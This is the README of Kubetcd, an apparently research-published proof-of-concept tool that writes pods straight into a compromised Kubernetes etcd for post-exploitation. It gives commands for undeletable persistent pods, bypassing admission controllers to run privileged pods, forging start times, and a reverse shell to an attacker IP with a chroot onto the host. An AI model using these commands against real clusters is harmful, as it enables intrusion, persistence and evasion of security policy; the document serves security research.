Kubetcd 
-----

Wrapper of https://github.com/jpbetz/auger.

It automates pod deployment by writing directly into etcd. It includes multiple functions for post-exploitation of compromised etcds.

Disclaimer
-----

> [!WARNING]  
> **This is a PoC, do not use it in a production environment. Writing directly to etcd may result in inconsistencies or corrupted data, which may cause the `kube-apiserver` logic to fail to retrieve or manipulate data from etcd. Test environments with multiple nodes can be deployed with KIND**

Why?
----

The main repo, auger, provides the main features for serialising and deserialising protobuffered entries in etcd. Kubetcd is a PoC that wraps these features to approximate `etcdctl` to the regular `kubectl` client. In a scenario with a compromised etcd, `kubetcd` would attempt to use manipulated and privileged pods to gain persistence and privileged access to any/all host(s) in the cluster. **Note that `kubetcd` currently only supports pod operation.**

Requirements
------------
`Kubetcd` takes the certificates and keys to authenticate against `etcd` service from the following default paths:

- /etc/kubernetes/pki/etcd/ca.crt
- /etc/kubernetes/pki/etcd/server.crt
- /etc/kubernetes/pki/etcd/server.key (this is only readable by root)

Also, the default endpoint is set as `127.0.0.1:2379`

All previous default values could be changed through parameters.

Also, `etcdctl`, the client for `etcd`, must be installed.

```sh
sudo apt install etcd-client
```


Installation
------------

Check out and build:

```sh
git clone https://github.com/nccgroup/kubetcd
cd kubetcd
go build -buildvcs=false .
```

### Known issues

You may experience the following error:

```sh
./kubetcd: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.32' not found (required by ./kubetcd)
./kubetcd: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34' not found (required by ./kubetcd)
```

If so, build `kubetcd` with Golang 1.19.

Refer to https://github.com/jpbetz/auger for the main auger features, which still remain. 
This README will only detail the added new features of the wrapper:

---------

Running kubetcd
------------


```sh
./kubetcd -h
```

### Get objects

``` sh
./kubetcd get pods
#or
./kubetcd get pod <name> -n <namespace>
```

### Create a new pod

`templateName` should be a running pod in the default namespace:

``` sh
./kubetcd create pod <name> -t <templateName>
```

You can overwrite a running pod just by setting the same `name` and `templateName` values.

### Change the image

``` sh
./kubetcd create pod <name> -t <templateName> --image <image>
```

### Tamper start time

``` sh
./kubetcd create pod <name> -t <templateName> --time "2000-01-31T00:00:00Z"
```

### Persistence through inconsistent data

ETCD save new pods in `/registry/pods/<namespace>/<name>` but `namespace` and `name` fields could be tampered.
Having so, this pods can be listed using `kubectl` but not deleted.

``` sh
./kubetcd create pod <name> -t <templateName> -p <randomentry>             
#Will add an entry in /registry/pods/default/<randomentry>
#Or tamperede namespace
./kubetcd create pod <name> -t <templateName> -n <namespace> --fake-ns
#Will add an entry in /registry/pods/<namespace>/<randomentry> but it will run in default namespace
```

### Deploy in a concrete node

Deploy workload in any node at will:

``` sh
./kubetcd get nodes
./kubetcd create pod <name> -t <templatename> --node <nodeName>
``` 

### Bypass AdmissionControllers

Deploy privileged pods in restricted namespaces.
This would bypass built-in AdmissionControllers like PSPs, PSAs or any other policies based on custom policies like OPA Gatekeer or Kyverno:

``` sh
./kubetcd create pod <name> -t <nameTemplate> -n <restrictedNamespace> -P 
``` 

`-P` flag will set any pod as `privileged` and will share `network`, `PID` and `IPC` namespaces with the underlying node.

### Reverse shell

Deploy privileged pods in restricted namespaces and get a remote shell: 

``` sh
./kubetcd create pod <name> -t <nameTemplate> -n <restrictedNamespace> -P -r <IP>:<PORT>
``` 

This will start a reverse `perl` shell, which is present in several images by default.
Once you have the reverse shell, change the root filesystem with `chroot /host` to get full access to the node.


TODO
----

- [ ] Add support for other binaries -not only perl- to obtain remote shell
- [ ] Add support to use templates from other namespaces than default
- [ ] Add support to create/get/delete elements out of `corev1` branch

